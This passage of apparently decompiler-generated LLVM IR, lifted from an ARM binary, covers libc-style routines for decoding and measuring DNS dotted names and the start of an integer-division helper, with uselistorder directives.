  %v2_1a614.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1a604, %bb
  %v2_1a614 = phi i1 [ %v2_1a614.pre, %bb ], [ false, %dec_label_pc_1a604 ]
  %v1_1a614 = phi i1 [ %v1_1a614.pre, %bb ], [ %v1_1a604, %dec_label_pc_1a604 ]
  %v0_1a614 = phi i1 [ %v0_1a614.pre, %bb ], [ %v2_1a604, %dec_label_pc_1a604 ]
  %v3_1a614 = xor i1 %v2_1a614, %v1_1a614
  %v4_1a614 = or i1 %v0_1a614, %v3_1a614
  br i1 %v4_1a614, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1a614 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1a614, i32* @r4, align 4
  store i32 %v6_1a578, i32* @r5, align 4
  store i32 %v9_1a578, i32* @r6, align 4
  %v25_1a614 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1a614

.loopexit:                                        ; preds = %dec_label_pc_1a5d0, %dec_label_pc_1a5ac, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a61c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a61c, i32* @r4, align 4
  store i32 %v6_1a578, i32* @r5, align 4
  store i32 %v9_1a578, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1a604, { 0, 2, 1 }
  uselistorder i32 %v0_1a5ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1a5e4, { 1, 0 }
  uselistorder i32 %v2_1a5d0, { 1, 0 }
  uselistorder i32 %v1_1a5c4, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1a5d8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1a5a8, { 1, 0 }
  uselistorder i32 %v0_1a598, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1a5ec20, { 1, 0 }
  uselistorder i32 %v9_1a578, { 1, 0 }
  uselistorder i32 %v6_1a578, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 35, 38, 36, 41, 39, 42, 40, 44, 43, 46, 45, 48, 47, 50, 49 }
  uselistorder i32 (i8*)* @strlen, { 13, 25, 24, 12, 11, 15, 14, 9, 26, 23, 22, 21, 19, 20, 18, 17, 16, 8, 28, 27, 10, 7, 6, 1, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 5, 6, 1, 7, 2, 3, 4 }
  uselistorder i32* @r6, { 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 11, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 1, 0, 18, 19, 20, 21, 22, 137, 2, 138, 139, 140, 141, 142, 143, 144, 52, 3, 53, 54, 55, 145, 149, 148, 150, 151, 152, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 4, 69, 70, 71, 72, 73, 74, 75, 210, 215, 101, 102, 23, 24, 25, 103, 104, 105, 106, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 207, 208, 209, 181, 182, 5, 183, 184, 185, 186, 187, 188, 192, 13, 193, 194, 6, 76, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 77, 78, 79, 80, 81, 82, 83, 84, 153, 154, 155, 156, 157, 7, 12, 158, 36, 8, 37, 38, 159, 9, 160, 161, 85, 86, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 15, 16, 17, 87, 88, 89, 90, 211, 212, 213, 214, 14, 162, 163, 164, 165, 10, 166, 167, 168, 169, 146, 147, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 189, 190, 191 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1a604, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a5f8, { 1, 0 }
  uselistorder label %dec_label_pc_1a5ac, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1a620 = load i32, i32* @r4, align 4
  %v6_1a620 = load i32, i32* @r5, align 4
  %v0_1a624 = load i32, i32* @r0, align 4
  store i32 %v0_1a624, i32* %sl.global-to-local, align 4
  %v2_1a624 = icmp eq i32 %v0_1a624, 0
  br i1 %v2_1a624, label %.thread16, label %dec_label_pc_1a6c4.preheader

.thread16:                                        ; preds = %entry
  %v0_1a6301 = load i32, i32* @r2, align 4
  store i32 %v0_1a6301, i32* %sb.global-to-local, align 4
  %v0_1a6342 = load i32, i32* @r3, align 4
  store i32 %v0_1a6342, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1a6e4

dec_label_pc_1a6c4.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1a630 = load i32, i32* @r2, align 4
  store i32 %v0_1a630, i32* %sb.global-to-local, align 4
  %v0_1a634 = load i32, i32* @r3, align 4
  store i32 %v0_1a634, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1a6c43952 = load i32, i32* @r1, align 4
  %v2_1a6c44053 = add i32 %v1_1a6c43952, %v0_1a624
  %v3_1a6c44154 = inttoptr i32 %v2_1a6c44053 to i8*
  %v4_1a6c44255 = load i8, i8* %v3_1a6c44154, align 1
  %v6_1a6c44356 = zext i8 %v4_1a6c44255 to i32
  store i32 %v6_1a6c44356, i32* @r4, align 4
  %v2_1a6c84457 = icmp eq i8 %v4_1a6c44255, 0
  br i1 %v2_1a6c84457, label %bb35, label %dec_label_pc_1a648.lr.ph

dec_label_pc_1a648:                               ; preds = %dec_label_pc_1a648.lr.ph, %bb30
  %v2_1a6d050 = phi i1 [ %v2_1a6d04663, %dec_label_pc_1a648.lr.ph ], [ true, %bb30 ]
  %v6_1a6c448 = phi i32 [ %v6_1a6c44361, %dec_label_pc_1a648.lr.ph ], [ %v6_1a6c4, %bb30 ]
  %v1_1a6c447 = phi i32 [ %v1_1a6c43960, %dec_label_pc_1a648.lr.ph ], [ %v5_1a670, %bb30 ]
  %v1_1a64c = and i32 %v6_1a6c448, 192
  br i1 %v2_1a6d050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1a648
  %v1_1a650 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a650 = add i32 %v1_1a650, 1
  store i32 %v2_1a650, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1a648, %bb
  %v2_1a654 = icmp eq i32 %v1_1a64c, 192
  %v1_1a658 = add i32 %v1_1a6c447, 1
  store i32 %v1_1a658, i32* @r5, align 4
  br i1 %v2_1a654, label %dec_label_pc_1a660, label %dec_label_pc_1a680

dec_label_pc_1a660:                               ; preds = %bb28
  %v2_1a660 = add i32 %v1_1a658, %v0_1a660.ph59
  %v3_1a660 = inttoptr i32 %v2_1a660 to i8*
  %v4_1a660 = load i8, i8* %v3_1a660, align 1
  %v6_1a660 = zext i8 %v4_1a660 to i32
  %v1_1a668 = urem i32 %v6_1a6c448, 64
  br i1 %v2_1a6d050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1a660
  %v1_1a66c = load i32, i32* %r8.global-to-local, align 4
  %v2_1a66c = add i32 %v1_1a66c, 1
  store i32 %v2_1a66c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1a660, %bb29
  %v4_1a670 = mul nuw nsw i32 %v1_1a668, 256
  %v5_1a670 = or i32 %v6_1a660, %v4_1a670
  store i32 %v5_1a670, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1a6c4 = add i32 %v5_1a670, %v0_1a660.ph59
  %v3_1a6c4 = inttoptr i32 %v2_1a6c4 to i8*
  %v4_1a6c4 = load i8, i8* %v3_1a6c4, align 1
  %v6_1a6c4 = zext i8 %v4_1a6c4 to i32
  store i32 %v6_1a6c4, i32* @r4, align 4
  %v2_1a6c8 = icmp eq i8 %v4_1a6c4, 0
  br i1 %v2_1a6c8, label %dec_label_pc_1a6d0.bb36_crit_edge, label %dec_label_pc_1a648

dec_label_pc_1a680:                               ; preds = %bb28
  %v2_1a680 = add i32 %v6_1a6c448, %storemerge17.ph58
  store i32 %v2_1a680, i32* %r6.global-to-local, align 4
  %v2_1a684 = load i32, i32* %stack_var_-40, align 4
  %v1_1a688 = add i32 %v2_1a680, 1
  store i32 %v1_1a688, i32* %r7.global-to-local, align 4
  %v3_1a68c = icmp ult i32 %v1_1a688, %v2_1a684
  br i1 %v3_1a68c, label %dec_label_pc_1a694, label %dec_label_pc_1a6e4

dec_label_pc_1a694:                               ; preds = %dec_label_pc_1a680
  %v2_1a694 = add i32 %v1_1a658, %v0_1a660.ph59
  store i32 %v2_1a694, i32* @r1, align 4
  %v0_1a698 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a698 = add i32 %v0_1a698, %storemerge17.ph58
  store i32 %v2_1a698, i32* @r0, align 4
  store i32 %v6_1a6c448, i32* @r2, align 4
  %v0_1a6a0 = call i32 @memcpy()
  %v0_1a6a4 = load i32, i32* @r5, align 4
  %v1_1a6a4 = load i32, i32* @r4, align 4
  %v2_1a6a4 = add i32 %v1_1a6a4, %v0_1a6a4
  store i32 %v2_1a6a4, i32* %r1.global-to-local, align 4
  %v0_1a6a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_1a6a8 = add i32 %v0_1a6a8, %v2_1a6a4
  %v3_1a6a8 = inttoptr i32 %v2_1a6a8 to i8*
  %v4_1a6a8 = load i8, i8* %v3_1a6a8, align 1
  %v0_1a6ac = load i32, i32* %fp.global-to-local, align 4
  %v2_1a6ac = icmp eq i32 %v0_1a6ac, 0
  br i1 %v2_1a6ac, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1a694
  %v1_1a6b0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1a6b0 = add i32 %v1_1a6b0, %v1_1a6a4
  store i32 %v3_1a6b0, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1a694, %bb31
  %v2_1a6b4 = icmp eq i8 %v4_1a6a8, 0
  br i1 %v2_1a6b4, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1a6bc.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1a6bc = load i32, i32* %sb.global-to-local, align 4
  %v3_1a6bc = load i32, i32* %r6.global-to-local, align 4
  %v4_1a6bc = add i32 %v3_1a6bc, %v2_1a6bc
  %v5_1a6bc = inttoptr i32 %v4_1a6bc to i8*
  store i8 %v0_1a6bc.off0, i8* %v5_1a6bc, align 1
  %v0_1a6c0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1a6c4.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1a6d0.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1a6c439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a6c440 = add i32 %v1_1a6c439, %v0_1a6c4.pre.pre
  %v3_1a6c441 = inttoptr i32 %v2_1a6c440 to i8*
  %v4_1a6c442 = load i8, i8* %v3_1a6c441, align 1
  %v6_1a6c443 = zext i8 %v4_1a6c442 to i32
  store i32 %v6_1a6c443, i32* @r4, align 4
  %v2_1a6c844 = icmp eq i8 %v4_1a6c442, 0
  %v2_1a6d046 = icmp eq i32 %v0_1a6d0.pre.pre, 0
  br i1 %v2_1a6c844, label %dec_label_pc_1a6d0, label %dec_label_pc_1a648.lr.ph

dec_label_pc_1a648.lr.ph:                         ; preds = %dec_label_pc_1a6c4.preheader, %bb34
  %v2_1a6d04663 = phi i1 [ %v2_1a6d046, %bb34 ], [ false, %dec_label_pc_1a6c4.preheader ]
  %v6_1a6c44361 = phi i32 [ %v6_1a6c443, %bb34 ], [ %v6_1a6c44356, %dec_label_pc_1a6c4.preheader ]
  %v1_1a6c43960 = phi i32 [ %v1_1a6c439, %bb34 ], [ %v1_1a6c43952, %dec_label_pc_1a6c4.preheader ]
  %v0_1a660.ph59 = phi i32 [ %v0_1a6c4.pre.pre, %bb34 ], [ %v0_1a624, %dec_label_pc_1a6c4.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1a6c0.pre, %bb34 ], [ 0, %dec_label_pc_1a6c4.preheader ]
  br label %dec_label_pc_1a648

dec_label_pc_1a6d0:                               ; preds = %bb34
  br i1 %v2_1a6d046, label %dec_label_pc_1a6d0.bb36_crit_edge, label %bb35

dec_label_pc_1a6d0.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1a6d0
  %v0_1a6d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a6e4

bb35:                                             ; preds = %dec_label_pc_1a6c4.preheader, %dec_label_pc_1a6d0
  %v1_1a6d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a6d4 = add i32 %v1_1a6d4, 1
  store i32 %v2_1a6d4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a6e4

dec_label_pc_1a6e4:                               ; preds = %dec_label_pc_1a680, %bb35, %dec_label_pc_1a6d0.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1a6d8.pre, %dec_label_pc_1a6d0.bb36_crit_edge ], [ %v2_1a6d4, %bb35 ], [ -1, %dec_label_pc_1a680 ]
  store i32 %v3_1a620, i32* @r4, align 4
  store i32 %v6_1a620, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1a660.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1a6c4, { 1, 0 }
  uselistorder i32 %v5_1a670, { 0, 2, 1 }
  uselistorder i32 %v6_1a6c448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1a6d050, { 1, 0 }
  uselistorder i32 %v0_1a624, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 23, 26, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 11, 10, 19, 9, 8, 7, 6, 2, 17, 16, 1, 0, 18, 5, 15, 14, 13, 20, 12, 4, 3 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 14, 13 }
  uselistorder i32* @r3, { 11, 0, 12, 13, 3, 4, 14, 5, 6, 7, 8, 1, 2, 17, 20, 18, 19, 15, 9, 10, 16, 21 }
  uselistorder i32* @r2, { 87, 88, 10, 89, 90, 91, 92, 11, 25, 26, 27, 93, 94, 95, 72, 6, 73, 96, 12, 51, 97, 106, 107, 108, 109, 74, 75, 13, 7, 142, 143, 144, 145, 52, 53, 2, 54, 55, 56, 99, 100, 8, 57, 15, 16, 146, 3, 147, 152, 153, 157, 128, 39, 40, 41, 42, 43, 148, 130, 134, 135, 138, 136, 137, 131, 132, 133, 29, 127, 14, 110, 154, 19, 76, 58, 59, 60, 98, 1, 155, 5, 156, 61, 62, 63, 64, 9, 65, 66, 4, 67, 0, 68, 101, 102, 103, 104, 69, 70, 105, 17, 18, 28, 149, 150, 151, 30, 31, 32, 33, 34, 35, 36, 37, 38, 44, 45, 46, 47, 48, 49, 50, 71, 77, 78, 79, 80, 81, 82, 83, 84, 20, 21, 22, 23, 24, 85, 86, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 129, 139, 140, 141 }
  uselistorder i32* @r5, { 171, 172, 173, 174, 175, 176, 177, 8, 178, 179, 180, 181, 182, 183, 184, 5, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 26, 37, 9, 3, 38, 201, 205, 202, 203, 204, 22, 210, 206, 207, 208, 209, 211, 212, 213, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 10, 89, 90, 214, 218, 11, 220, 219, 4, 221, 12, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 250, 249, 24, 251, 163, 164, 165, 166, 167, 168, 293, 294, 91, 92, 93, 94, 95, 96, 97, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 98, 99, 0, 100, 101, 102, 103, 104, 105, 307, 308, 309, 310, 1, 311, 312, 313, 154, 155, 156, 157, 158, 159, 39, 40, 41, 42, 43, 44, 45, 169, 13, 7, 170, 46, 47, 50, 51, 52, 53, 54, 55, 56, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 160, 161, 162, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 266, 267, 14, 268, 315, 316, 317, 318, 106, 15, 107, 108, 109, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 110, 16, 111, 112, 113, 114, 115, 17, 224, 225, 226, 18, 222, 223, 57, 58, 59, 227, 228, 229, 116, 117, 27, 118, 119, 19, 120, 121, 122, 123, 124, 125, 25, 126, 127, 128, 129, 28, 133, 20, 134, 135, 136, 137, 138, 139, 140, 141, 6, 142, 143, 144, 145, 146, 147, 35, 36, 130, 2, 131, 132, 49, 48, 23, 319, 320, 230, 231, 232, 233, 21, 234, 235, 148, 149, 150, 151, 152, 153, 215, 216, 217, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 314, 70, 71, 72, 73, 74, 75, 76, 77, 29, 30, 31, 32, 33, 34, 263, 264, 265 }
  uselistorder label %dec_label_pc_1a6e4, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1a6d0.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a648.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1a6f0 = load i32, i32* @r0, align 4
  store i32 %v0_1a6f0, i32* @lr, align 4
  %v2_1a6f0 = icmp eq i32 %v0_1a6f0, 0
  br i1 %v2_1a6f0, label %bb, label %dec_label_pc_1a708

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1a700:                               ; preds = %dec_label_pc_1a710
  %v1_1a700 = add i32 %v1_1a718, 2
  br label %dec_label_pc_1a730

dec_label_pc_1a708:                               ; preds = %entry
  %v0_1a708 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a718

dec_label_pc_1a710:                               ; preds = %dec_label_pc_1a718
  %v1_1a724 = and i32 %v6_1a718, 192
  %v2_1a728 = add i32 %v6_1a718, %v1_1a71c
  %v2_1a710 = icmp eq i32 %v1_1a724, 192
  br i1 %v2_1a710, label %dec_label_pc_1a700, label %dec_label_pc_1a718

dec_label_pc_1a718:                               ; preds = %dec_label_pc_1a710, %dec_label_pc_1a708
  %v1_1a718 = phi i32 [ %v2_1a728, %dec_label_pc_1a710 ], [ %v0_1a708, %dec_label_pc_1a708 ]
  %v2_1a718 = add i32 %v1_1a718, %v0_1a6f0
  %v3_1a718 = inttoptr i32 %v2_1a718 to i8*
  %v4_1a718 = load i8, i8* %v3_1a718, align 1
  %v6_1a718 = zext i8 %v4_1a718 to i32
  %v1_1a71c = add i32 %v1_1a718, 1
  %v2_1a720 = icmp eq i8 %v4_1a718, 0
  br i1 %v2_1a720, label %dec_label_pc_1a730, label %dec_label_pc_1a710

dec_label_pc_1a730:                               ; preds = %dec_label_pc_1a718, %dec_label_pc_1a700
  %v1_1a730 = phi i32 [ %v1_1a700, %dec_label_pc_1a700 ], [ %v1_1a71c, %dec_label_pc_1a718 ]
  %v2_1a730 = sub i32 %v1_1a730, %v0_1a708
  ret i32 %v2_1a730

; uselistorder directives
  uselistorder i32 %v6_1a718, { 1, 0 }
  uselistorder i32 %v1_1a718, { 2, 1, 0 }
  uselistorder i32 %v0_1a6f0, { 0, 2, 1 }
  uselistorder i8 0, { 65, 16, 24, 25, 66, 15, 21, 67, 47, 71, 69, 46, 70, 68, 45, 39, 8, 9, 72, 73, 77, 78, 23, 61, 62, 74, 75, 76, 14, 79, 40, 48, 81, 80, 49, 41, 82, 83, 84, 85, 86, 87, 10, 52, 91, 0, 89, 88, 50, 1, 90, 51, 2, 92, 93, 26, 3, 95, 94, 53, 96, 97, 98, 99, 42, 43, 101, 102, 100, 11, 12, 13, 103, 4, 27, 104, 17, 105, 106, 18, 63, 28, 29, 5, 107, 108, 109, 111, 112, 113, 114, 110, 44, 115, 116, 117, 118, 119, 19, 30, 31, 32, 33, 34, 120, 121, 35, 22, 6, 7, 123, 122, 36, 124, 125, 37, 126, 54, 20, 127, 128, 129, 130, 132, 55, 133, 134, 131, 135, 136, 137, 138, 140, 139, 141, 64, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 155, 158, 157, 159, 56, 161, 160, 38, 162, 57, 163, 165, 166, 164, 58, 167, 168, 60, 169, 59, 170, 171, 172, 173, 174, 175 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 3, 6 }
  uselistorder i32* @r1, { 97, 98, 1, 99, 100, 101, 104, 102, 103, 9, 10, 23, 105, 106, 107, 108, 109, 110, 111, 112, 3, 113, 114, 56, 115, 116, 117, 118, 121, 124, 125, 126, 127, 128, 129, 4, 86, 87, 13, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 6, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 5, 201, 202, 11, 119, 120, 57, 58, 59, 60, 61, 62, 63, 64, 65, 14, 19, 20, 203, 2, 204, 78, 79, 143, 33, 34, 206, 144, 149, 150, 153, 151, 152, 145, 146, 147, 148, 24, 205, 80, 15, 130, 136, 140, 139, 207, 208, 209, 66, 67, 68, 16, 141, 17, 69, 131, 132, 133, 134, 135, 7, 81, 82, 8, 12, 70, 71, 72, 0, 73, 74, 75, 18, 22, 122, 123, 76, 77, 21, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 83, 84, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 137, 138, 142, 154 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1a738 = icmp slt i32 %arg2, 0
  %v2_1a738 = icmp eq i32 %arg2, 0
  %v0_1a73c = load i32, i32* @r0, align 4
  %v2_1a73c = xor i32 %v0_1a73c, %arg2
  br i1 %v2_1a738, label %dec_label_pc_1a850, label %dec_label_pc_1a744

dec_label_pc_1a744:                               ; preds = %entry
  br i1 %v1_1a738, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1a744
  %v2_1a744 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1a744, %bb
  %v1_1a810 = phi i32 [ %v2_1a744, %bb ], [ %arg2, %dec_label_pc_1a744 ]
  %v1_1a748 = add i32 %v1_1a810, -1
  %v7_1a748 = icmp eq i32 %v1_1a810, 1
  br i1 %v7_1a748, label %dec_label_pc_1a7f0, label %dec_label_pc_1a750

dec_label_pc_1a750:                               ; preds = %thread-pre-split
  %v1_1a750 = icmp slt i32 %v0_1a73c, 0
  br i1 %v1_1a750, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1a750
  %v2_1a754 = sub i32 0, %v0_1a73c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1a750, %bb85
  %v0_1a844 = phi i32 [ %v0_1a73c, %dec_label_pc_1a750 ], [ %v2_1a754, %bb85 ]
  %v3_1a758 = icmp uge i32 %v0_1a844, %v1_1a810
  %v9_1a758 = icmp eq i32 %v0_1a844, %v1_1a810
  %v2_1a75c = xor i1 %v3_1a758, true
  %v3_1a75c = or i1 %v9_1a758, %v2_1a75c
  br i1 %v3_1a75c, label %dec_label_pc_1a7fc, label %dec_label_pc_1a760

dec_label_pc_1a760:                               ; preds = %bb86
  %v2_1a760 = and i32 %v1_1a748, %v1_1a810
  %v4_1a760 = icmp eq i32 %v2_1a760, 0
  br i1 %v4_1a760, label %dec_label_pc_1a80c, label %dec_label_pc_1a768

dec_label_pc_1a768:                               ; preds = %dec_label_pc_1a760
  %v3_1a768 = icmp ult i32 %v1_1a810, 536870912
  br i1 %v3_1a768, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a768
  %v4_1a76c = mul i32 %v1_1a810, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a768, %.thread
  %v0_1a78c.pr40.ph = phi i32 [ %v4_1a76c, %.thread ], [ %v1_1a810, %dec_label_pc_1a768 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a768 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1a78c.pr40 = phi i32 [ %v4_1a780, %bb89 ], [ %v0_1a78c.pr40.ph, %.preheader.preheader ]
  %v1_1a784 = phi i32 [ %v4_1a784, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1a778 = icmp ugt i32 %v0_1a78c.pr40, 268435455
  br i1 %v2_1a778, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1a78cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1a77c = icmp ult i32 %v0_1a78c.pr40, %v0_1a844
  br i1 %v4_1a77c, label %bb88, label %dec_label_pc_1a78cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1a780 = and i32 %v0_1a78c.pr40, 268435456
  %v3_1a780 = icmp eq i32 %v2_1a780, 0
  %v4_1a780 = mul i32 %v0_1a78c.pr40, 16
  br i1 %v3_1a780, label %bb89, label %dec_label_pc_1a78c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1a784 = and i32 %v1_1a784, 268435456
  %v3_1a784 = icmp eq i32 %v2_1a784, 0
  %v4_1a784 = mul i32 %v1_1a784, 16
  br i1 %v3_1a784, label %.preheader, label %dec_label_pc_1a78cthread-pre-split.loopexit.loopexit

dec_label_pc_1a78cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1a79852.ph = phi i32 [ %v1_1a784, %bb87 ], [ %v4_1a784, %bb89 ]
  %v0_1a78c.pr42.ph = phi i32 [ %v0_1a78c.pr40, %bb87 ], [ %v4_1a780, %bb89 ]
  br label %dec_label_pc_1a78cthread-pre-split.loopexit

dec_label_pc_1a78cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1a78cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1a79852 = phi i32 [ %v1_1a784, %.thread3 ], [ %v1_1a79852.ph, %dec_label_pc_1a78cthread-pre-split.loopexit.loopexit ]
  %v0_1a78c.pr42 = phi i32 [ %v0_1a78c.pr40, %.thread3 ], [ %v0_1a78c.pr42.ph, %dec_label_pc_1a78cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a78cthread-pre-split

dec_label_pc_1a78cthread-pre-split:               ; preds = %dec_label_pc_1a78cthread-pre-split.loopexit, %bb91
  %v1_1a79850 = phi i32 [ %v1_1a79852, %dec_label_pc_1a78cthread-pre-split.loopexit ], [ %v3_1a798, %bb91 ]
  %v2_1a79048 = phi i32 [ %v0_1a844, %dec_label_pc_1a78cthread-pre-split.loopexit ], [ %v2_1a790, %bb91 ]
